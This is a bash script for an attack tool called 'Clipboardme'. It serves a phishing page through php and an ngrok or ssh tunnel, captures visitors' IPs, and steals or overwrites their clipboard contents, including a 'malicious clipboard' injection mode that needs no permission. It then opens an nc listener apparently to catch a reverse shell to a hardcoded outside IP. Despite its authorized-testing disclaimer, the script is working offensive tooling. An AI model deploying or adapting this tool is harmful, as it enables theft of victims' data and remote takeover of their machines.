#!/bin/bash
# Clipboardme v1.3
# coded by: @linux_choice (twitter)
# github.com/thelinuxchoice/clipboardme


trap 'printf "\n";stop' 2
server_tcp="3.17.202.129" #NGROK TCP IP
banner() {


printf "\e[1;77m    ______ _ _       _                          _               \e[0m\n"
printf "\e[1;77m   / _____) (_)     | |                        | |              \e[0m\n"
printf "\e[1;77m  | /     | |_ ____ | | _   ___   ____  ____ _ | |\e[0m\e[1;92m ____   ____  \e[0m\n"
printf "\e[1;77m  | |     | | |  _ \| || \ / _ \ / _  |/ ___) || |\e[0m\e[1;92m|    \ / _  ) \e[0m\n"
printf "\e[1;77m  | \_____| | | | | | |_) ) |_| ( ( | | |  ( (_| |\e[0m\e[1;92m| | | ( (/ /  \e[0m\n"
printf "\e[1;77m   \______)_|_| ||_/|____/ \___/ \_||_|_|   \____|\e[0m\e[1;92m|_|_|_|\____) \e[0m\n"
printf "\e[1;77m              |_|                                               \e[0m\n"
printf "\e[1;77m             .:.:\e[0m\e[1;93m Grab/Inject clipboard content \e[0m\e[1;77m:.:.\e[0m\n"                              
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.3 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]         github.com/thelinuxchoice/clipboardme         \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] \e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

if [[ $grab_inject == false ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[93m Malicious code injected!\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
if [[ $forward == true ]];then

nc -lvp 4444
else
nc -lvp $server_port
fi
fi

fi

sleep 0.5

if [[ -e "clipboard.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target's Clipboard received:\e[0m\n"
printf "\n\e[1;77m"
cat clipboard.txt
printf "\n\e[0m"
touch clipboard_backup.txt
cat clipboard.txt >> clipboard_backup.txt
rm -rf clipboard.txt
printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m clipboard_backup.txt\e[0m\n"
printf "\n\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[93m Malicious code injected!\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
if [[ $forward == true ]];then

nc -lvp 4444
else
nc -lvp $server_port
fi
fi
sleep 0.5

done 

}


ngrok_server() {
forward=true

if [[ -e "clipboard.txt" ]]; then
rm -rf clipboard.txt
fi

if [[ -e "ip.txt" ]]; then
rm -rf ip.txt
fi

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o '64bit' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'64bit'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (port 3333)...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

if [[ -e check_ngrok ]]; then
rm -rf ngrok_check
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\e[0m\n"
./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
sleep 10

check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)

if [[ ! -z $check_ngrok ]];then
printf "\n\e[91mAuthtoken missing!\e[0m\n"
printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
rm -rf check_ngrok
exit 1
fi

if [[ -e check_ngrok ]]; then
rm -rf check_ngrok
fi

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")

if [[ ! -z $link ]]; then 
printf "\e[1;92m[\e[0m*\e[1;92m] TCP server:\e[0m\e[1;77m %s\e[0m\n" $link
else
printf "\n\e[91mNgrok Error!\e[0m\n"
exit 1
fi

}


payload() {

if [[ $forward == true ]];then
server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 choose-subdomain@ssh.localhost.run \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Send the \e[0m\e[1;77mHTTPS\e[0m\e[92m link \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Clipboard access is only allowed over \e[0m\e[1;77mHTTPS\e[0m\e[92m domains \e[0m\n"
fi

if [[ $grab_inject == true ]]; then
sed 's+server_tcp+'$server_tcp'+g' cliptext.html | sed 's+server_port+'$server_port'+g' > index.php
else
sed 's+server_tcp+'$server_tcp'+g' writetext.html | sed 's+server_port+'$server_port'+g' > index.php
fi

}

clip_option() {


printf "\n"
printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Grab/Inject clipboard content \e[0m\e[1;77m(requires user permission)\e[0m\e[1;93m:\e[0m\n"
printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Inject malicious clipboard \e[0m\e[1;77m(does not require permission)\e[0m\e[1;93m:\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m' option_clip
option_server="${option_server:-${default_option_server}}"

if [[ $option_clip -eq 1 ]]; then
grab_inject=true
elif [[ $option_clip -eq 2 ]]; then
grab_inject=false
else
printf "\e[1;91m[!] Invalid option\n"
exit 1
fi

}


start() {

if [[ -e ip.txt ]]; then
rm -f ip.txt
fi
printf "\n"
printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom LPORT/LHOST:\e[0m\n"
default_option_server="1"
default_redirect_url="https://www.google.com"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
forward=true
#settings2
ngrok_server
payload
checkfound
#listener
elif [[ $option_server -eq 2 ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LHOST: \e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
server_tcp=$custom_ip
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LPORT: \e[0m' custom_port
if [[ -z "$custom_port" ]]; then
exit 1
fi
server_port=$custom_port
#settings2
payload
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on port 3333...\n"
php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
checkfound
#listener
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}



banner
dependencies
clip_option
ngrok_server
payload
checkfound
#start
